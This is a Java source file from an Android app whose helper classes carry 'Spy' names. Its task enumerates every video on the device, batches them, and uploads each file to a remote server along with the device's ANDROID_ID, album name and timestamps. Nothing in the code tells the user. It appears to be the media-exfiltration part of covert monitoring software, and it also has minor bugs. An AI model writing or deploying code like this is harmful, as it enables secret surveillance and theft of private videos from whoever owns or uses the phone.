/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.io.File;
import java.sql.Timestamp;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.TimeZone;

import org.json.JSONObject;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.MediaStore;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.ConnectUrl;
import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.JsonPostRequest;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

/**
 * @author jitendrav
 *
 */
public class VideoAsyncTask extends AsyncTask<String, Void, String> {
	
	private Context ctx;
	private static final String TAG = "VideoAsyncTask";
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;	
	/**
	 * 
	 */
	public VideoAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected String doInBackground(String... params) {		
		try{
			getVideoDetail();
			
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedDeviceVideos();
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
/*********************** Start Video *****************************/
	
	public void getVideoDetail() {
		
		String filepath,imagename,imagetype;

		try {
			final String orderBy =MediaStore.Video.VideoColumns._ID;
			Cursor imagecursor1 = ctx.getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, null, null, null, orderBy);
			int getTotal = imagecursor1.getCount();

			int PreImageCount = SpyCallSharedPrefrence.getsaveVIDEO_PreCount(ctx);
			int remaingCount = getTotal - PreImageCount;
			Log.i("remaining count", ""+remaingCount);

			int pp;
			if (remaingCount > 0) {
				Log.i("remaining count", remaingCount + "");
				if (remaingCount > 2) {
					pp = 2;
				} else {
					pp = remaingCount;
				}
				Cursor imagecursor = ctx.getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, null,
						null, null,
						orderBy + " LIMIT " + PreImageCount + "," + pp);
				// CallActivity.Imagescount=CallActivity.Imagescount+pp;
				int image_column_index = imagecursor.getColumnIndex(MediaStore.Video.VideoColumns._ID);
				Log.i("getTotalt***************", "" + getTotal);
				int j = 0;
				int countImage = 0;
				while (imagecursor.moveToNext()) {
					countImage++;
					imagecursor.getInt(image_column_index);
					int dataColumnIndex = imagecursor.getColumnIndex(MediaStore.Video.VideoColumns.DATA);
					int dateIndex = imagecursor.getColumnIndex(MediaStore.Video.VideoColumns.DATE_TAKEN);
					//for finding the size
					int mvideoSizeIndex = imagecursor.getColumnIndex(MediaStore.Video.VideoColumns.SIZE);
					
					String bucket;
					int bucketColumn = imagecursor.getColumnIndex(MediaStore.Video.Media.BUCKET_DISPLAY_NAME);

					// Get the field values
					bucket = imagecursor.getString(bucketColumn);

					 // Do something with the values.
					Log.i("ListingImages", " bucket=" + bucket);
					
					String mvideoSize=imagecursor.getString(mvideoSizeIndex);
				    double mvideoSizeMB=(Integer.parseInt(mvideoSize))/(1024*1024);
				    
					Log.e("video size", mvideoSize+"");
					
					
					double duration;
					int durationColumn = imagecursor.getColumnIndex(MediaStore.Video.Media.DURATION);
					
					// Get the field values
					duration = imagecursor.getDouble(durationColumn)/1000;
					
					System.out.println(duration); 
					
					
					String ImageDate = imagecursor.getString(dateIndex);
					if (ImageDate.equals("null")) {
						Long.valueOf("1523415");
					}
					long xyz = Long.valueOf(ImageDate);
					Timestamp st = new Timestamp(xyz);
					java.util.Date date1 = new java.util.Date(st.getTime());
					DateFormat df = DateFormat.getDateInstance();
					TimeZone zone1 = TimeZone.getTimeZone(df.getTimeZone()
							.getID()); // For example...
					DateFormat format1 = new SimpleDateFormat(
							"yyyy-MM-dd HH-mm-ss"); // Put your pattern here
					format1.setTimeZone(zone1);
					String SMStime = format1.format(date1);

					/*
					 * Calendar c = Calendar.getInstance(); SimpleDateFormat df
					 * = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); String
					 * SMStime = df.format(c.getTime());
					 */

					filepath = imagecursor.getString(dataColumnIndex);
					Log.i("filepath************************", filepath);
					/*Bitmap bm = null;
					String newFilePath = "";
					try {
						bm = Utility.readBitmap(Uri.fromFile(new File(filepath)),
								DeviceVideoUploadService.this);

					} catch (Exception e) {
						// TODO: handle exception
						e.printStackTrace();
					}

					// newFilePath = saveImage(bm,id);

					if (bm.getByteCount() >= 2000) {
						newFilePath = Utility.saveImage(bm, id);
					} else {
						newFilePath = filepath;
					}*/

					j = filepath.lastIndexOf("/");
					imagename = filepath.substring(j + 1,filepath.lastIndexOf("."));
					imagetype = filepath.substring(filepath.lastIndexOf(".") + 1);
					try {
						if (Utility.isNetworkAvailable(ctx)) {
							//bm.recycle();
							System.gc();
							//video should be uploaded greater less than equals to 10 mb
							if(mvideoSizeMB<=6){
								int videoPreCount=PreImageCount + pp;
							new YourAsyncTask_VideoDetail().execute(filepath, imagename, imagetype, SMStime,"" + countImage, videoPreCount+ "",pp+"",bucket,duration+"");
							}else{
								SpyCallSharedPrefrence.saveVIDEO_PreCount(ctx, PreImageCount+countImage);
							}
						}

					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				// CallActivity.Imagescount=CallActivity.Imagescount+pp;
				//CellPoliceSharedPreferences.saveVIDEO_PreCount(ctx, PreImageCount + pp);
			} 
		} catch (Exception e) {
			 //new YourAsyncTask_Facebook().execute();
			e.printStackTrace();
		}
	}

	class YourAsyncTask_VideoDetail extends AsyncTask<String, Void, Void> {

		int getcountImage = 0;
		int getRemainingCount;

		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {
			// make your request here - it will run in a different thread
			try {
				getcountImage = Integer.parseInt(params[4]);
				getRemainingCount= Integer.parseInt(params[6]);
				String getResponceImages = uploadDeviceVideo(params[0], params[1],params[2], params[3],params[7],params[8]);
				Log.e(TAG,getResponceImages);
				JSONObject responseObject = new JSONObject(getResponceImages);
				if (responseObject.getJSONObject("response").getString("image").equals("Video Success")) {
					SpyCallSharedPrefrence.saveVIDEO_PreCount(ctx, Integer.parseInt(params[5]));
					Log.i(TAG, "Success");
				}
			} catch (Exception e) {
				 //new YourAsyncTask_Facebook().execute();
				
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {

			// Log.i("imageuploade resposne******************",
			// getResponceImages);
			Log.i(TAG, ""+getcountImage);
			Log.i(TAG, ""+getRemainingCount);
			if(getcountImage==getRemainingCount)  {
				try {
					 
				} catch (Exception e) {
					// TODO: handle exception
					e.printStackTrace();
				}
			}
		}
	}

	public String uploadDeviceVideo(String imagename, String imagename2,
			String imagetype,String imageDate,String albumname,String duration) {

		String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		
		//Log.e("getDeviceIDString for Upload Images  ",getDeviceIDString);
		Log.i("resonse", "anotherone");
		File file = new File(imagename);
		ArrayList<String> arraylist2 = new ArrayList<String>();
		arraylist2.add(file.getPath());
		ArrayList<String[]> arraylist1 = new ArrayList<String[]>();
		/*String a[] = { "user_id", getUserID_SP};
		arraylist1.add(a);*/
		String b[] = { "date_time",imageDate};
		arraylist1.add(b);
		String c[] = { "device_os", "Android" };
		arraylist1.add(c);
		String e[] = { "type", "video" };
		arraylist1.add(e);
		String f[] = { "upload_device_id", android_id };
		arraylist1.add(f);
		String g[] = { "album", albumname };
		arraylist1.add(g);
		String h[] = { "duration", duration };
		arraylist1.add(h);
		JsonPostRequest postrequest = new JsonPostRequest();
		String imageResponse = postrequest.doPostWithFile1(ConnectUrl.URL_Images_upload, arraylist1,arraylist2, imagename2, imagetype);
		arraylist2.clear();
		arraylist1.clear();
		return imageResponse;
	}
	/*********************** End Video *******************************/
}
